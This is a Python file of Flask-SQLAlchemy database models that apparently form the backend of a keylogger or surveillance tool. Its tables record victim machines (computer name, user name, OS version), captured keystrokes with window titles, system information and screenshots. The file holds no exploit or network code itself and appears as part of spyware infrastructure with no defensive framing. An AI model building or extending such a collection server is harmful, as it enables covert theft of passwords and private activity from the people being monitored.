from src.database.database import db
from datetime import datetime

class Client(db.Model):
    id = db.Column(db.String(64), primary_key=True)
    computer_name = db.Column(db.String(128))
    user_name = db.Column(db.String(128))
    os_version = db.Column(db.String(128))
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class KeyLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(64), db.ForeignKey('client.id'))
    timestamp = db.Column(db.DateTime)
    window_title = db.Column(db.String(512))
    key_data = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class SystemInfo(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(64), db.ForeignKey('client.id'))
    data = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Screenshot(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(64), db.ForeignKey('client.id'))
    image_data = db.Column(db.LargeBinary)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)